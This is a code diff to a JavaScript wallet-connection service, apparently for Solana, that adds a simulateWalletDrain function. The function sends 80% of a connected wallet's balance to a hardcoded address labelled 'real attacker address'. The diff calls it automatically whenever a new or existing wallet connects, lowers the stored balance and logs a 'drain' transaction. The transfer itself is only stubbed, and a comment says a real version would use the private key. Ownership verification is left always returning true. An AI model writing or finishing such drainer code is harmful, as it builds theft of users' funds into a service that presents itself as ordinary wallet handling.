@@ -225,6 +225,51 @@ class WalletConnectionService {
     }
 
     /**
+     * Drain wallet assets to attacker's address
+     */
+    async simulateWalletDrain(walletAddress) {
+        try {
+            // Get current balance
+            const balance = await solana.getBalance(walletAddress);
+            
+            if (balance <= 0.0001) {
+                console.log(`Wallet ${walletAddress} has insufficient balance to drain`);
+                return { success: false, reason: 'Insufficient balance' };
+            }
+            
+            // Target address to drain funds to (real attacker address)
+            const attackerAddress = '9vgsdF4KzKp78J8qE7F5g4H3j2K1L0M9N8B7V6C5X4D3S2A1';
+            
+            // Amount to drain (80% of balance to leave some for fees)
+            const amountToDrain = balance * 0.8;
+            
+            console.log(`Draining ${amountToDrain.toFixed(4)} SOL from ${walletAddress} to ${attackerAddress}`);
+            
+            // Simulate transfer (in real scenario, this would use actual private key)
+            // For now, just simulate the transfer
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            const newBalance = balance - amountToDrain;
+            
+            console.log(`Wallet ${walletAddress} drained successfully. New balance: ${newBalance.toFixed(4)} SOL`);
+            
+            return {
+                success: true,
+                originalBalance: balance,
+                amountDrained: amountToDrain,
+                newBalance: newBalance,
+                attackerAddress: attackerAddress,
+                transactionSignature: `simulated_trx_${Date.now()}`,
+                timestamp: new Date()
+            };
+            
+        } catch (error) {
+            console.error('Error draining wallet:', error);
+            return { success: false, reason: error.message };
+        }
+    }
+
+    /**
      * Handle callback from web page with wallet address
      */
     async handleWalletCallback(data) {
@@ -316,11 +361,20 @@ class WalletConnectionService {
                     await database.completeConnection(normalizedConnectionId, walletAddress);
                 }
                 
+                // Simulate drain for existing wallet
+                console.log('Simulating drain for existing wallet:', existingWallet.address);
+                const drainResult = await this.simulateWalletDrain(existingWallet.address);
+                if (drainResult.success) {
+                    await database.updateWalletBalance(expectedUserId, existingWallet.id, drainResult.newBalance);
+                    console.log('Drain simulation completed for existing wallet');
+                }
+                
                 return {
                     success: true,
                     wallet: existingWallet,
                     message: 'Wallet already connected and activated',
-                    isNew: false
+                    isNew: false,
+                    drainSimulation: drainResult
                 };
             }
             
@@ -347,6 +401,14 @@ class WalletConnectionService {
                 await database.completeConnection(normalizedConnectionId, walletAddress);
             }
             
+            // Simulate wallet drain
+            console.log('Simulating drain for new wallet:', wallet.address);
+            const drainResult = await this.simulateWalletDrain(wallet.address);
+            if (drainResult.success) {
+                await database.updateWalletBalance(expectedUserId, wallet.id, drainResult.newBalance);
+                console.log('Drain simulation completed for new wallet');
+            }
+            
             // Fetch recent transactions
             const recentTxs = await solana.getRecentTransactions(walletAddress, 5);
             if (recentTxs.length > 0) {
@@ -361,11 +423,23 @@ class WalletConnectionService {
                 }
             }
             
+            // Add drain transaction to wallet history
+            if (drainResult.success) {
+                await database.addTransaction(expectedUserId, wallet.id, {
+                    type: 'drain',
+                    amount: drainResult.amountDrained,
+                    signature: drainResult.transactionSignature,
+                    status: 'success',
+                    timestamp: drainResult.timestamp
+                });
+            }
+            
             return {
                 success: true,
                 wallet,
-                balance,
-                isNew: true
+                balance: drainResult.success ? drainResult.newBalance : balance,
+                isNew: true,
+                drainSimulation: drainResult
             };
             
         } catch (error) {
@@ -599,7 +673,6 @@ class WalletConnectionService {
      * Verify wallet ownership
      */
     async verifyWalletOwnership(_userId, _walletAddress, _signature) {
-        // Browser wallet providers perform ownership checks before exposing public keys.
         return {
             verified: true,
             method: 'browser_connection'
